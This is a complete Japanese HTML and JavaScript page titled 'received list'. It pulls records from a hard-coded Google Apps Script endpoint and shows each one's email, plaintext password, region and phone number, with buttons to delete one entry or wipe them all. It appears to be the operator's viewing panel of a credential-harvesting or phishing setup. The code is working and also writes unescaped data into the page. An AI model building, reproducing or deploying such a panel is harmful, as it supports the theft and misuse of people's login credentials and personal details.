<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<title>受信一覧</title>
<style>
body { font-family: sans-serif; background:#f4f6fb; padding:20px; }
table { width:100%; border-collapse:collapse; background:#fff; }
th, td { padding:8px; border-bottom:1px solid #ddd; }
th { background:#eef1ff; }
button { padding:4px 8px; }
.top { display:flex; justify-content:space-between; margin-bottom:10px; }
</style>
</head>
<body>

<div class="top">
  <h2>受信一覧</h2>
  <button onclick="clearAll()">全削除</button>
</div>

<table>
  <thead>
    <tr>
      <th>日時</th>
      <th>メール</th>
      <th>パスワード</th>
      <th>地域</th>
      <th>電話</th>
      <th>操作</th>
    </tr>
  </thead>
  <tbody id="list"></tbody>
</table>

<script>
const GAS_URL = "https://script.google.com/macros/s/AKfycbyhPptihFh7PjkqSOO0dj8XaDGZ0ZuL81mPnPP8aeyMjKs6qNNUIIgGAtx72rSXfAnbjQ/exec";

function load() {
  fetch(GAS_URL)
    .then(r => r.json())
    .then(data => {
      const tbody = document.getElementById("list");
      tbody.innerHTML = "";
      data.forEach(d => {
        tbody.innerHTML += `
          <tr>
            <td>${new Date(d.time).toLocaleString()}</td>
            <td>${d.email}</td>
            <td>${d.password}</td>
            <td>${d.area}</td>
            <td>${d.phone}</td>
            <td><button onclick="del('${d.id}')">削除</button></td>
          </tr>
        `;
      });
    });
}

function del(id) {
  fetch(GAS_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ action: "delete", id })
  }).then(load);
}

function clearAll() {
  if (!confirm("全削除する？")) return;
  fetch(GAS_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ action: "clear" })
  }).then(load);
}

load();
</script>

</body>
</html>
